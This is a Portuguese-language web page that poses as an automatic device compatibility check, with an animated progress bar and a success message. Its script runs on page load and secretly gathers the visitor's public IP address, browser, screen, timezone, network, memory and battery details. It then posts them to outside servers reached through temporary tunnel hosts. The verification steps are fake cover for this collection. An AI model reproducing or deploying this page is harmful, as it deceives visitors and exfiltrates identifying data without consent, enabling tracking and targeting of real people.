<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Compatibilidade</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            max-width: 500px;
            width: 100%;
            overflow: hidden;
            position: relative;
        }
        
        .header {
            background: linear-gradient(45deg, #1e3c72, #2a5298);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: repeating-linear-gradient(
                45deg,
                transparent,
                transparent 10px,
                rgba(255,255,255,0.05) 10px,
                rgba(255,255,255,0.05) 20px
            );
            animation: slide 20s linear infinite;
        }
        
        @keyframes slide {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        .header-content {
            position: relative;
            z-index: 1;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
            font-weight: 300;
        }
        
        .verification-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .content {
            padding: 40px 30px;
            text-align: center;
        }
        
        .status-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 500;
        }
        
        .progress-container {
            margin-bottom: 30px;
        }
        
        .progress-bar {
            background: #e9ecef;
            border-radius: 25px;
            height: 12px;
            overflow: hidden;
            position: relative;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .progress-fill {
            background: linear-gradient(45deg, #28a745, #20c997, #17a2b8);
            background-size: 30px 30px;
            height: 100%;
            width: 0%;
            transition: width 0.8s ease;
            position: relative;
            border-radius: 25px;
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { background-position: -30px 0; }
            100% { background-position: 30px 0; }
        }
        
        .progress-text {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
            font-weight: 500;
        }
        
        .verification-steps {
            text-align: left;
            margin: 30px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            padding: 12px 0;
            font-size: 14px;
            color: #666;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .step:last-child {
            border-bottom: none;
        }
        
        .step-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-size: 12px;
            font-weight: bold;
            background: #e9ecef;
            color: #666;
            transition: all 0.5s ease;
        }
        
        .step.active .step-icon {
            background: #007bff;
            color: white;
            animation: bounce 0.5s ease;
        }
        
        .step.completed .step-icon {
            background: #28a745;
            color: white;
        }
        
        @keyframes bounce {
            0%, 20%, 60%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            80% { transform: translateY(-5px); }
        }
        
        .step-text {
            flex: 1;
        }
        
        .step.completed .step-text {
            color: #28a745;
            font-weight: 500;
        }
        
        .hidden {
            display: none !important;
        }
        
        .success-screen {
            text-align: center;
            padding: 40px 30px;
        }
        
        .success-icon {
            font-size: 80px;
            color: #28a745;
            margin-bottom: 20px;
            animation: successPulse 1s ease-in-out;
        }
        
        @keyframes successPulse {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .success-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .success-description {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .continue-button {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .continue-button:hover {
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(40,167,69,0.3);
        }
        
        .session-info {
            font-size: 12px;
            opacity: 0.6;
            margin-top: 20px;
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 15px;
            display: none;
            background: #f8d7da;
            padding: 10px;
            border-radius: 5px;
        }

        .debug-info {
            font-size: 12px;
            color: #6c757d;
            margin-top: 20px;
            text-align: left;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }

        .debug-toggle {
            color: #007bff;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
            display: inline-block;
        }

        .retry-button {
            background: #6c757d;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Tela de Progresso -->
        <div id="progressScreen">
            <div class="header">
                <div class="header-content">
                    <div class="verification-icon">⚙️</div>
                    <h1>Verificando Dispositivo</h1>
                    <p>Analisando compatibilidade automaticamente</p>
                </div>
            </div>
            
            <div class="content">
                <div class="status-text" id="progressStatusText">
                    Iniciando verificação...
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">0% concluído</div>
                </div>
                
                <div class="verification-steps">
                    <div class="step" id="progress-step1">
                        <div class="step-icon">1</div>
                        <div class="step-text">Verificando navegador e sistema operacional</div>
                    </div>
                    <div class="step" id="progress-step2">
                        <div class="step-icon">2</div>
                        <div class="step-text">Coletando informações técnicas</div>
                    </div>
                    <div class="step" id="progress-step3">
                        <div class="step-icon">3</div>
                        <div class="step-text">Verificando conectividade</div>
                    </div>
                    <div class="step" id="progress-step4">
                        <div class="step-icon">4</div>
                        <div class="step-text">Finalizando verificação</div>
                    </div>
                </div>

                <div class="error-message" id="errorMessage">
                    Erro ao conectar com o servidor. Verificando alternativas...
                </div>

                <div class="debug-info" id="debugInfo">
                    <strong>Informações de Debug:</strong>
                    <div id="debugContent"></div>
                </div>

                <div class="debug-toggle" id="debugToggle" onclick="toggleDebug()">
                    Mostrar informações técnicas
                </div>
                
                <div class="session-info">
                    Sessão: <span id="sessionId"></span>
                </div>
            </div>
        </div>
        
        <!-- Tela de Sucesso -->
        <div id="successScreen" class="hidden">
            <div class="success-screen">
                <div class="success-icon">✅</div>
                <div class="success-title">Verificação Concluída!</div>
                <div class="success-description">
                    Seu dispositivo é totalmente compatível com nossos recursos. 
                    Todas as funcionalidades estão disponíveis e funcionando perfeitamente.
                </div>
                <button class="continue-button" id="continueButton">
                    Continuar para o Aplicativo
                </button>

                <div class="session-info">
                    Sessão: <span id="finalSessionId"></span> | 
                    Status: <span id="serverStatus">Dados enviados com sucesso</span>
                </div>

                <button class="retry-button" id="retryButton" style="display: none;">
                    Tentar enviar dados novamente
                </button>
            </div>
        </div>
    </div>

    <script>
        // *** CONFIGURAÇÃO CRUCIAL: URLs dos servidores ***
        const SERVER_URLS = [
            'https://scheduling-aye-songs-organised.trycloudflare.com',
            'https://socialdivulga.serveo.net',
            'http://127.0.0.1:8000'  // Localhost para testes
        ];   
        
        // Gerar um ID de sessão único
        function generateSessionId() {
            return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }
        
        const sessionId = generateSessionId();
        document.getElementById('sessionId').textContent = sessionId;
        document.getElementById('finalSessionId').textContent = sessionId;
        
        let currentStep = 0;
        let currentServerIndex = 0;
        let dataSentSuccessfully = false;
        let collectedData = {};
        let debugInfo = [];
        
        // Obter o IP público usando uma API externa
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Erro ao obter IP:", error);
                return "Não foi possível obter o IP";
            }
        }
        
        // Função para fazer requisições com headers personalizados
        async function customFetch(endpoint, data) {
            debugInfo.push(`Tentando enviar dados para o servidor...`);
            updateDebugInfo();
            
            // Tentar cada servidor até encontrar um que funcione
            for (let i = 0; i < SERVER_URLS.length; i++) {
                const serverUrl = SERVER_URLS[i];
                debugInfo.push(`Tentando servidor ${i+1}: ${serverUrl}`);
                updateDebugInfo();
                
                try {
                    // Usar AbortController para timeout
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos de timeout
                    
                    const response = await fetch(serverUrl + endpoint, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "ngrok-skip-browser-warning": "true"
                        },
                        body: JSON.stringify(data),
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        debugInfo.push(`✅ Dados enviados com sucesso para ${serverUrl}`);
                        updateDebugInfo();
                        currentServerIndex = i; // Usar este servidor para próximas requisições
                        return true;
                    } else {
                        debugInfo.push(`❌ Erro do servidor ${serverUrl}: ${response.status}`);
                        updateDebugInfo();
                    }
                } catch (error) {
                    if (error.name === 'AbortError') {
                        debugInfo.push(`⏰ Timeout ao conectar com ${serverUrl}`);
                    } else {
                        debugInfo.push(`❌ Erro ao conectar com ${serverUrl}: ${error.message}`);
                    }
                    updateDebugInfo();
                }
            }
            
            // Se nenhum servidor respondeu, mostrar mensagem de erro
            document.getElementById('errorMessage').style.display = 'block';
            document.getElementById('retryButton').style.display = 'inline-block';
            return false;
        }

        // Coleta de informações do dispositivo
        async function collectDeviceInfo() {
            try {
                const publicIP = await getPublicIP();
                
                collectedData = {
                    session_id: sessionId,
                    timestamp: new Date().toISOString(),
                    ip_address: publicIP,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio,
                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                    },
                    browser: {
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        languages: navigator.languages,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        vendor: navigator.vendor || 'unknown',
                        javaEnabled: navigator.javaEnabled(),
                        doNotTrack: navigator.doNotTrack || 'unspecified'
                    },
                    window: {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        location: window.location.href,
                        referrer: document.referrer || 'none'
                    },
                    platform: {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset()
                    },
                    network: {
                        connection: navigator.connection ? {
                            effectiveType: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt,
                            saveData: navigator.connection.saveData,
                            type: navigator.connection.type || 'unknown'
                        } : 'unavailable'
                    },
                    media: {
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                        pdfViewer: navigator.pdfViewerEnabled || false,
                        webGL: (() => {
                            try {
                                const canvas = document.createElement('canvas');
                                return !!(window.WebGLRenderingContext && 
                                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
                            } catch (e) {
                                return false;
                            }
                        })()
                    },
                    storage: {
                        localStorage: typeof(Storage) !== "undefined",
                        sessionStorage: typeof(Storage) !== "undefined",
                        cookies: navigator.cookieEnabled
                    },
                    performance: {
                        memory: window.performance && performance.memory ? {
                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                            totalJSHeapSize: performance.memory.totalJSHeapSize,
                            usedJSHeapSize: performance.memory.usedJSHeapSize
                        } : 'unavailable'
                    }
                };

                // Informações de bateria (se disponível)
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        collectedData.battery = {
                            charging: battery.charging,
                            level: battery.level * 100,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {
                        console.log("Não foi possível acessar informações da bateria");
                    }
                }

                // Enviar dados para o servidor
                dataSentSuccessfully = await customFetch("/device_info", collectedData);
                
                if (!dataSentSuccessfully) {
                    document.getElementById('serverStatus').textContent = "Falha no envio dos dados";
                    document.getElementById('serverStatus').style.color = "#dc3545";
                } else {
                    document.getElementById('serverStatus').textContent = "Dados enviados com sucesso";
                    document.getElementById('serverStatus').style.color = "#28a745";
                }
                
            } catch (error) {
                console.error("Erro ao coletar informações:", error);
                dataSentSuccessfully = false;
                document.getElementById('serverStatus').textContent = "Erro na coleta de dados";
                document.getElementById('serverStatus').style.color = "#dc3545";
                debugInfo.push(`❌ Erro na coleta de dados: ${error.message}`);
                updateDebugInfo();
            }
        }

        function updateDebugInfo() {
            const debugContent = document.getElementById('debugContent');
            debugContent.innerHTML = debugInfo.map(item => `<div>${item}</div>`).join('');
        }

        function toggleDebug() {
            const debugInfo = document.getElementById('debugInfo');
            const debugToggle = document.getElementById('debugToggle');
            
            if (debugInfo.style.display === 'none') {
                debugInfo.style.display = 'block';
                debugToggle.textContent = 'Ocultar informações técnicas';
            } else {
                debugInfo.style.display = 'none';
                debugToggle.textContent = 'Mostrar informações técnicas';
            }
        }

        const steps = [
            {
                text: "Verificando navegador e sistema operacional...",
                duration: 1500
            },
            {
                text: "Coletando informações técnicas...",
                duration: 2000
            },
            {
                text: "Verificando conectividade...",
                duration: 1500
            },
            {
                text: "Finalizando verificação...",
                duration: 1500
            }
        ];
        
        function startVerification() {
            currentStep = 0;
            runVerificationStep();
            
            // Iniciar coleta de dados
            collectDeviceInfo();
        }
        
        function runVerificationStep() {
            if (currentStep >= steps.length) {
                return;
            }
            
            const step = steps[currentStep];
            
            // Atualizar texto de status
            document.getElementById('progressStatusText').textContent = step.text;
            
            // Marcar step como ativo
            const stepElement = document.getElementById(`progress-step${currentStep + 1}`);
            stepElement.classList.add('active');
            
            // Simular progresso
            const targetProgress = ((currentStep + 1) / steps.length) * 100;
            animateProgress(targetProgress);
            
            // Aguardar duração do step
            setTimeout(() => {
                // Marcar step como completo
                stepElement.classList.remove('active');
                stepElement.classList.add('completed');
                
                currentStep++;
                
                // Se for o último step, mostrar tela de sucesso
                if (currentStep >= steps.length) {
                    setTimeout(() => {
                        showSuccessScreen();
                    }, 500);
                } else {
                    runVerificationStep();
                }
            }, step.duration);
        }
        
        function animateProgress(targetPercent) {
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            const currentPercent = parseInt(progressFill.style.width) || 0;
            const increment = (targetPercent - currentPercent) / 20;
            
            let current = currentPercent;
            const interval = setInterval(() => {
                current += increment;
                if (current >= targetPercent) {
                    current = targetPercent;
                    clearInterval(interval);
                }
                
                progressFill.style.width = current + '%';
                progressText.textContent = Math.round(current) + '% concluído';
            }, 50);
        }
        
        function showSuccessScreen() {
            document.getElementById('progressScreen').classList.add('hidden');
            document.getElementById('successScreen').classList.remove('hidden');
        }
        
        function redirectToApp() {
            alert('🎉 Redirecionando para o aplicativo principal!');
            // Aqui você pode redirecionar para outra página ou mostrar o conteúdo principal
            // window.location.href = '/main';
        }
        
        function retrySendData() {
            document.getElementById('retryButton').style.display = 'none';
            document.getElementById('serverStatus').textContent = "Tentando enviar dados novamente...";
            collectDeviceInfo();
        }
        
        // Iniciar automaticamente quando a página carrega
        window.addEventListener('load', function() {
            startVerification();
        });
        
        // Adicionar event listeners
        document.getElementById('continueButton').addEventListener('click', redirectToApp);
        document.getElementById('retryButton').addEventListener('click', retrySendData);
    </script>
</body>
</html>
